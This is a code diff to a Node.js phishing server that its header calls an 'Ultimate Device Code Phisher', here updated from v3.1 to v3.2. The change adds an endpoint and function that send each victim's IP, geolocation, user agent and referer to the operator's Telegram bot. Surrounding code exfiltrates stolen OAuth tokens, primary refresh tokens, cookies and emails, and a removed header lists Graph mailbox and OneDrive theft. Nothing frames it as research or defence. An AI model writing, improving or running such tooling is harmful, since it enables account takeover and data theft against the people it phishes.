@@ -1,13 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v3.1 – With /device route
+// 🥔 ULTIMATE DEVICE CODE PHISHER v3.2 – Visit Notifications
 // ============================================================
-// Includes: Device Code, Auto-Refresh, Multi-Tenant, PRT,
-// Dashboard, Graph Email/OneDrive/Calendar/Contacts Exfil,
-// IP Geolocation, Second-Stage Phishing with MFA,
-// Multi-Service, Session Replay with Cookies, WebSocket,
-// Health Check, Multi-Channel Exfil, Anti-Bot, Custom Redirect,
-// QR Code, Fingerprinting, Token Export ZIP, Manual Exchange,
-// Polling Fallback, Session Cleanup, and now /device route.
+// Now sends Telegram notification on every page visit.
 // ============================================================
 
 const http = require('http');
@@ -131,7 +125,7 @@ async function getGeo(ip) {
     return fallback;
 }
 
-// ── Multi‑Channel Exfil ──
+// ── Multi‑Channel Exfil (for credentials) ──
 async function exfiltrate(data) {
     const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint } = data;
     const geo = await getGeo(ip);
@@ -190,6 +184,27 @@ async function exfiltrate(data) {
     }
 
     console.log(`✅ Exfiltrated session ${sessionId}`);
+}
+
+// ── Visit Notification (just a visit, no tokens) ──
+async function sendVisitNotification(sessionId, ip, userAgent, referer) {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ Telegram credentials missing – visit notification skipped.');
+        return;
+    }
+    const geo = await getGeo(ip);
+    const message = `🌐 **New Device Page Visit!**\n\n🆔 Session: ${sessionId}\n🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n🖥️ UA: ${userAgent || 'N/A'}\n🔗 Referer: ${referer || 'Direct'}\n🕒 Time: ${new Date().toISOString()}`;
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        }, { timeout: 5000 });
+        console.log(`✅ Visit notification sent for session ${sessionId}`);
+    } catch (e) {
+        console.warn('Visit notification failed:', e.message);
+    }
 }
 
 // ── Graph API Deep Exfil ──
@@ -308,7 +323,7 @@ app.use((req, res, next) => {
     next();
 });
 
-// ── Serve custom device page from /device (NEW ROUTE) ──
+// ── Serve custom device page from /device ──
 app.get('/device', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
 });
@@ -347,17 +362,45 @@ app.post('/device/request', async (req, res) => {
             service: service,
             tenant: 'organizations',
             cookies: [],
-            fingerprint: null
+            fingerprint: null,
+            visit_notified: false  // flag to avoid duplicate visit alerts
         };
         flows.push(flow);
         saveFlows();
-        res.json(data);
+        // Return session_id along with device data
+        res.json({
+            ...data,
+            session_id: flow.session_id
+        });
     } catch (error) {
         console.error('Device request error:', error.response?.data || error.message);
         res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
     }
 });
 
+// ── Visit Notification Endpoint ──
+app.post('/device/visit', async (req, res) => {
+    const { sessionId } = req.body;
+    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
+    const flow = flows.find(f => f.session_id === sessionId);
+    if (!flow) return res.status(404).json({ error: 'session not found' });
+    // Prevent duplicate notifications
+    if (flow.visit_notified) {
+        return res.json({ success: true, already: true });
+    }
+    flow.visit_notified = true;
+    saveFlows();
+
+    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
+
+    // Send notification
+    await sendVisitNotification(sessionId, ip, userAgent, referer);
+    res.json({ success: true });
+});
+
+// ── Device Token Endpoint ──
 app.post('/device/token', async (req, res) => {
     const { device_code } = req.body;
     if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
@@ -641,7 +684,7 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v3.1 running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v3.2 running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device  (serves device_code.html)`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
